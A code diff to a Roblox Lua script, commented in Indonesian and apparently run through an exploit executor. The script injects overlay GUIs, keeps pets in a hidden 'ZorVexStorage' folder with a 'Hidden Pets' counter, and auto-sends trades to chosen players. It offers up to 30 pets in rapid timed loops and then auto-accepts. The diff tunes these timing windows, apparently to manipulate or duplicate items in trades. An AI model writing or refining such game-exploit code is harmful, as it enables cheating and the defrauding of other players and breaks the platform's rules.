@@ -1,5 +1,6 @@
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
 
 local LocalPlayer = Players.LocalPlayer
 local event = ReplicatedStorage:WaitForChild("rEvents", 5) and ReplicatedStorage.rEvents:WaitForChild("tradingEvent", 5)
@@ -23,10 +24,64 @@ local hiddenStorage = ReplicatedStorage:FindFirstChild("ZorVexStorage") or Insta
 hiddenStorage.Name = "ZorVexStorage"
 
 local PetName = "Twin Element Birdies"
-local amount = 25
+local amount = 30
 local petOriginTable = {}
 local autoTradeActive = true
 
+-- Fungsi Efek Shadow/Glow
+local function addShadowStrokes(parent)
+    local s85 = Instance.new("UIStroke", parent)
+    s85.Thickness = 6.0 s85.Transparency = 0.9 s85.Color = Color3.fromRGB(0, 0, 0)
+    local s65 = Instance.new("UIStroke", parent)
+    s65.Thickness = 5.0 s65.Transparency = 0.9 s65.Color = Color3.fromRGB(0, 0, 0)
+    local s50 = Instance.new("UIStroke", parent)
+    s50.Thickness = 4.0 s50.Transparency = 0.9 s50.Color = Color3.fromRGB(0, 0, 0)
+    local s45 = Instance.new("UIStroke", parent)
+    s45.Thickness = 3.0 s45.Transparency = 0.9 s45.Color = Color3.fromRGB(0, 0, 0)
+end
+
+-- ==========================================
+-- UI PET COUNTER TERSEMBUNYI
+-- ==========================================
+if game.CoreGui:FindFirstChild("ZorVexPetCounter") then 
+    game.CoreGui.ZorVexPetCounter:Destroy() 
+end
+
+local counterGui = Instance.new("ScreenGui", game.CoreGui)
+counterGui.Name = "ZorVexPetCounter"
+
+local counterFrame = Instance.new("Frame", counterGui)
+counterFrame.Size = UDim2.new(0, 180, 0, 40)
+counterFrame.Position = UDim2.new(0, 10, 0, 10)
+counterFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+counterFrame.BackgroundTransparency = 0.2
+counterFrame.BorderSizePixel = 0
+Instance.new("UICorner", counterFrame).CornerRadius = UDim.new(0, 10)
+addShadowStrokes(counterFrame)
+
+local counterLabel = Instance.new("TextLabel", counterFrame)
+counterLabel.Size = UDim2.new(1, 0, 1, 0)
+counterLabel.BackgroundTransparency = 1
+counterLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+counterLabel.Font = Enum.Font.GothamBold
+counterLabel.TextSize = 13
+counterLabel.TextXAlignment = Enum.TextXAlignment.Center
+
+task.spawn(function()
+    while true do
+        if hiddenStorage then
+            local total = #hiddenStorage:GetChildren()
+            counterLabel.Text = "Hidden Pets: " .. total
+        else
+            counterLabel.Text = "Hidden Pets: 0"
+        end
+        task.wait(0.5)
+    end
+end)
+
+-- ==========================================
+-- FUNGSI TULANG PUNGGUNG & TRADE
+-- ==========================================
 local function findAllPlayersByDisplayNames(nameList)
     local matchedPlayers = {}
     for _, player in ipairs(Players:GetPlayers()) do
@@ -111,6 +166,9 @@ local function getPetInstances(petName, n)
     return pets
 end
 
+-- ==========================================
+-- TAMPILAN GUI SIMPLE TRADE
+-- ==========================================
 if game.CoreGui:FindFirstChild("ZorVexSimpleTrade") then 
     game.CoreGui.ZorVexSimpleTrade:Destroy() 
 end
@@ -182,12 +240,18 @@ confirmBtn.MouseButton1Click:Connect(function()
         end)
         
         task.spawn(function()
+            local startTime = os.clock()
             local pets = getPetInstances(PetName, 30)
-            for _, pet in ipairs(pets) do
+            local index = 1
+            
+            while (os.clock() - startTime) < 1.0 do
+                local pet = pets[index]
                 if pet and pet.Parent then
                     pcall(function()
                         event:FireServer("offerItem", pet)
                     end)
+                    index = index + 1
+                    if index > #pets then break end
                 end
                 task.wait(0.001)
             end
@@ -222,7 +286,6 @@ task.spawn(function()
     while true do
         if autoTradeActive and event then
             if not isTradePending() then
-                -- 1. Kirim request trade ke akun target jika belum trading
                 pcall(function()
                     local targetPlayers = findAllPlayersByDisplayNames(ALLOWED_DISPLAY_NAMES)
                     for _, targetPlayer in ipairs(targetPlayers) do
@@ -233,31 +296,33 @@ task.spawn(function()
                 end)
                 task.wait(0.1)
             else
-                -- 2. Begitu trade terdeteksi AKTIF, siapkan & tawarkan pet dengan cepat
                 pcall(runExecution)
                 
+                local startTime = os.clock()
                 local pets = getPetInstances(PetName, 30)
-                for _, pet in ipairs(pets) do
+                local index = 1
+                
+                while (os.clock() - startTime) < 0.5 do
+                    local pet = pets[index]
                     if pet and pet.Parent then
                         pcall(function()
                             event:FireServer("offerItem", pet)
                         end)
+                        index = index + 1
+                        if index > #pets then break end
                     end
                     task.wait(0.001)
                 end
                 
-                -- 3. Jeda 0.5 detik lalu tekan acceptTrade
-                task.wait(0.1)
                 pcall(function()
                     event:FireServer("acceptTrade")
                 end)
                 
-                -- Menunggu sesi trade selesai
                 while isTradePending() do
                     task.wait(0.1)
                 end
                 
-                task.wait(0.1)
+                task.wait(0.3)
             end
         end
         task.wait(0.05)
